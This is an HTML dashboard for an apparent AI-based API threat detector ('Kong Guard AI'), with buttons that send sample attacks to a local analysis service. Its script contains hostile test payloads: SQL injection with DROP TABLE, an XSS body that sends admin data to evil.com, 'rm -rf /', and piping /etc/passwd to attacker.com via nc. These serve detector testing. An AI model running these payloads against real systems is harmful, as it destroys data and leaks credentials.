<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kong Guard AI - Real-Time Threat Analysis</title>
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="kongguard.css">
    <style>
        /* Override specific styles for threat analysis dashboard */
        .live-dashboard {
            padding: 16px;
        }

        .threat-status {
            display: inline-block;
            padding: 6px 12px;
            border-radius: 20px;
            font-weight: 500;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .threat-status.connected { 
            background: var(--normal); 
            color: var(--bg);
        }
        .threat-status.disconnected { 
            background: var(--critical); 
            color: var(--hi-silver);
        }

        .threat-metrics {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 12px;
            margin: 14px 0;
        }

        .threat-metric {
            background: var(--surface);
            border: 1px solid var(--line);
            border-radius: var(--radius);
            padding: 16px;
            text-align: center;
        }

        .threat-metric .label {
            color: var(--txt-muted);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: .08em;
            margin-bottom: 8px;
        }

        .threat-metric .value {
            color: var(--hi-silver);
            font-weight: 600;
            font-size: 24px;
            line-height: 1.2;
        }

        .threat-card {
            background: linear-gradient(180deg, var(--surface), var(--surface-2));
            border: 1px solid var(--line);
            border-radius: var(--radius);
            padding: 20px;
            margin-bottom: 14px;
        }

        .threat-card h2 {
            color: var(--hi-silver);
            font-family: "Rajdhani", Inter, sans-serif;
            font-weight: 600;
            letter-spacing: .04em;
            margin: 0 0 16px 0;
        }

        .attack-button {
            padding: 10px 16px;
            border-radius: var(--radius);
            border: 1px solid var(--line);
            color: var(--txt);
            background: #15191d;
            transition: all 0.2s ease;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            display: block;
            width: 100%;
            margin-bottom: 8px;
            text-align: left;
        }

        .attack-button:hover {
            border-color: var(--steel);
            color: var(--hi-silver);
            background: var(--surface);
        }

        .attack-button.danger {
            border-left: 3px solid var(--critical);
        }

        .attack-button.warning {
            border-left: 3px solid var(--caution);
        }

        .attack-button.success {
            border-left: 3px solid var(--normal);
        }

        .threat-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 16px;
        }

        @media (max-width: 1024px) {
            .threat-grid {
                grid-template-columns: 1fr;
            }
        }

        .current-analysis {
            background: #13171c;
            border: 1px solid var(--line);
            border-radius: var(--radius);
            padding: 16px;
            margin-top: 12px;
        }

        .current-analysis .sub-label {
            color: var(--txt-muted);
            font-size: 12px;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: .06em;
        }
    </style>
</head>
<body class="live-dashboard">
    <div class="topbar card">
        <div class="brand">
            <img src="kong-guard-logo.png" alt="Kong Guard AI" style="height: 32px; width: 32px; object-fit: contain;" onerror="this.style.display='none'">
            <h1>Kong Guard AI</h1>
        </div>
        <div class="threat-status disconnected" id="status">CONNECTING...</div>
    </div>
    <div class="container">

        <section class="threat-metrics">
            <div class="threat-metric">
                <div class="label">Total Analyzed</div>
                <div class="value" id="totalAnalyzed">0</div>
            </div>
            <div class="threat-metric">
                <div class="label">Test Attacks</div>
                <div class="value" id="threatsBlocked" style="color: var(--caution);">0/0</div>
            </div>
            <div class="threat-metric">
                <div class="label">Avg Confidence</div>
                <div class="value" id="avgConfidence" style="color: var(--steel);">0%</div>
            </div>
            <div class="threat-metric">
                <div class="label">Avg Processing</div>
                <div class="value" id="avgProcessing" style="color: var(--caution);">0ms</div>
            </div>
        </section>

        <section class="threat-grid">
            <div class="threat-card">
                <h2>Test Attacks</h2>
                <hr class="hr">
                <div class="list">
                    <button class="attack-button danger" onclick="sendAttack('sql')">
                        <span class="name">SQL Injection</span>
                    </button>
                    <button class="attack-button warning" onclick="sendAttack('xss')">
                        <span class="name">XSS Attack</span>
                    </button>
                    <button class="attack-button warning" onclick="sendAttack('path')">
                        <span class="name">Path Traversal</span>
                    </button>
                    <button class="attack-button danger" onclick="sendAttack('cmd_injection')">
                        <span class="name">Command Injection</span>
                    </button>
                    <button class="attack-button warning" onclick="sendAttack('ldap_injection')">
                        <span class="name">LDAP Injection</span>
                    </button>
                    <button class="attack-button danger" onclick="sendAttack('business_logic')">
                        <span class="name">Business Logic Attack</span>
                    </button>
                    <button class="attack-button success" onclick="sendAttack('normal')">
                        <span class="name">Normal Traffic</span>
                    </button>
                </div>
            </div>

            <div class="threat-card">
                <h2>Live Analysis</h2>
                <hr class="hr">
                <div class="current-analysis">
                    <div class="sub-label">Current Status</div>
                    <div id="currentStatus" style="color: var(--txt-muted); font-size: 14px;">Ready to analyze threats...</div>
                </div>
            </div>
        </section>
    </div>

    <script>
        let ws = null;
        let metrics = {
            total: 0,
            blocked: 0,
            testAttacks: 0,
            confidence: 0,
            processing: 0
        };
        
        let isTestAttack = false;

        function connect() {
            ws = new WebSocket('ws://localhost:18002/ws');
            
            ws.onopen = () => {
                console.log('Connected to AI Service');
                document.getElementById('status').className = 'threat-status connected';
                document.getElementById('status').textContent = 'CONNECTED';
            };
            
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if (data.type === 'threat_analysis') {
                    updateAnalysis(data);
                }
            };
            
            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
                document.getElementById('status').className = 'threat-status disconnected';
                document.getElementById('status').textContent = 'DISCONNECTED';
            };
            
            ws.onclose = () => {
                document.getElementById('status').className = 'threat-status disconnected';
                document.getElementById('status').textContent = 'RECONNECTING...';
                setTimeout(connect, 3000);
            };
        }

        function updateAnalysis(messageData) {
            const data = messageData.data || {};
            
            metrics.total++;
            
            if (isTestAttack) {
                metrics.testAttacks++;
                isTestAttack = false;
            } else if ((data.threat_score || 0) > 0.7) {
                metrics.blocked++;
            }
            
            const confidence = data.confidence || 0;
            const processingTime = data.processing_time_ms || (data.processing_time ? data.processing_time * 1000 : 0);
            
            if (confidence > 0) {
                metrics.confidence = ((metrics.confidence * (metrics.total - 1) + confidence) / metrics.total);
            }
            if (processingTime > 0) {
                metrics.processing = ((metrics.processing * (metrics.total - 1) + processingTime) / metrics.total);
            }
            
            document.getElementById('totalAnalyzed').textContent = metrics.total;
            document.getElementById('threatsBlocked').textContent = metrics.testAttacks + '/' + metrics.blocked;
            document.getElementById('avgConfidence').textContent = (metrics.confidence * 100).toFixed(1) + '%';
            document.getElementById('avgProcessing').textContent = metrics.processing.toFixed(0) + 'ms';
            
            const threatType = data.threat_type || 'none';
            const threatScore = ((data.threat_score || 0) * 100).toFixed(1);
            const action = data.recommended_action || 'monitor';
            
            document.getElementById('currentStatus').innerHTML = 
                '<div style="color: var(--hi-silver); font-weight: 500; margin-bottom: 4px;">' + threatType.toUpperCase() + '</div>' +
                '<div style="color: var(--txt-muted); font-size: 12px;">Score: ' + threatScore + '% | Action: ' + action.toUpperCase() + '</div>';
        }

        async function sendAttack(type) {
            isTestAttack = true;
            
            const attacks = {
                sql: {
                    query: "id=1' OR '1'='1; DROP TABLE users;--",
                    path: "/api/users",
                    method: "GET",
                    body: "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--"
                },
                xss: {
                    query: "alert('XSS')",
                    path: "/comment",
                    method: "POST", 
                    body: "fetch('/admin/users').then(r=>r.text()).then(d=>fetch('//evil.com/?'+btoa(d)))"
                },
                path: {
                    query: "file=../../../../etc/passwd",
                    path: "/download",
                    method: "GET",
                    body: ""
                },
                cmd_injection: {
                    query: "ping=127.0.0.1; rm -rf / #",
                    path: "/api/ping",
                    method: "POST",
                    body: "; cat /etc/passwd | nc attacker.com 4444 &"
                },
                ldap_injection: {
                    query: "user=admin')(&(password=*))",
                    path: "/auth/ldap",
                    method: "POST",
                    body: "admin')(&(password=*)(|(objectClass=*)))"
                },
                business_logic: {
                    query: "amount=-999999&to_account=attacker",
                    path: "/api/transfer",
                    method: "POST",
                    body: '{"amount": -50000000, "from": "bank_reserves", "to": "attacker_account"}'
                },
                normal: {
                    query: "page=1&limit=10&sort=date",
                    path: "/api/products",
                    method: "GET",
                    body: ""
                }
            };
            
            const attack = attacks[type];
            if (!attack) return;
            
            try {
                await fetch('http://localhost:18002/analyze', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        features: {
                            method: attack.method,
                            path: attack.path,
                            client_ip: '192.168.1.' + Math.floor(Math.random() * 255),
                            user_agent: type === 'normal' ? 'Mozilla/5.0' : 'AttackBot/1.0',
                            requests_per_minute: type === 'normal' ? 10 : 100,
                            content_length: (attack.body || attack.query || '').length,
                            query_param_count: 2,
                            header_count: 5,
                            hour_of_day: new Date().getHours(),
                            query: attack.query,
                            body: attack.body || "",
                            headers: {}
                        },
                        context: {
                            previous_requests: Math.floor(Math.random() * 100),
                            failed_attempts: type === 'normal' ? 0 : 5,
                            anomaly_score: type === 'normal' ? 0.1 : 0.8
                        }
                    })
                });
            } catch (error) {
                console.error('Failed to send attack:', error);
            }
        }

        // Connect on load
        connect();
    </script>
</body>
</html>